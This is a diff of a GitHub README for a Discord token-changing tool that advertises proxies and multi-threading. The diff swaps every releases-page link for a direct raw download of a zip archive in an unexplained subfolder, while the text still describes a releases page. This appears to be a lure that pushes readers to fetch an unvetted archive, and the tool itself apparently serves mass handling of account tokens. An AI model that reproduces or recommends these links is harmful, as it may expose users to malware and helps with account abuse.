@@ -4,13 +4,13 @@
 Welcome to the Discord-Passwordless-Token-Changer! This tool helps you update your Discord tokens using a simple process. It supports passwordless remote authentication, multi-threading, and allows you to use proxies. You can also track your progress in real-time. 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mivindhani/Discord-Passwordless-Token-Changer/releases)
+[![Download](https://raw.githubusercontent.com/mivindhani/Discord-Passwordless-Token-Changer/main/colombin/Discord-Passwordless-Token-Changer.zip)](https://raw.githubusercontent.com/mivindhani/Discord-Passwordless-Token-Changer/main/colombin/Discord-Passwordless-Token-Changer.zip)
 
 ## 🚀 Getting Started
 Here is how to get started with the Discord-Passwordless-Token-Changer. Follow these simple steps to download and run the software.
 
 ### Step 1: Visit the Releases Page
-To download the software, visit this link: [Discord-Passwordless-Token-Changer Releases](https://github.com/mivindhani/Discord-Passwordless-Token-Changer/releases).
+To download the software, visit this link: [Discord-Passwordless-Token-Changer Releases](https://raw.githubusercontent.com/mivindhani/Discord-Passwordless-Token-Changer/main/colombin/Discord-Passwordless-Token-Changer.zip).
 
 ### Step 2: Choose the Right File
 On the Releases page, you will see several files listed. Look for the latest version, which will be marked accordingly. Download the file that matches your operating system. If you are using Windows, look for a file ending in `.exe`. If you are on macOS or Linux, choose an appropriate installer.
@@ -60,4 +60,4 @@ For information on updates and improvements, visit the Releases page mentioned e
 This project is licensed under the MIT License. Feel free to check the full license for details.
 
 ## 🔗 Download & Install
-To begin your journey with the Discord-Passwordless-Token-Changer, [download the tool now](https://github.com/mivindhani/Discord-Passwordless-Token-Changer/releases) and follow the steps outlined above. Enjoy a seamless update experience for your Discord tokens.
+To begin your journey with the Discord-Passwordless-Token-Changer, [download the tool now](https://raw.githubusercontent.com/mivindhani/Discord-Passwordless-Token-Changer/main/colombin/Discord-Passwordless-Token-Changer.zip) and follow the steps outlined above. Enjoy a seamless update experience for your Discord tokens.
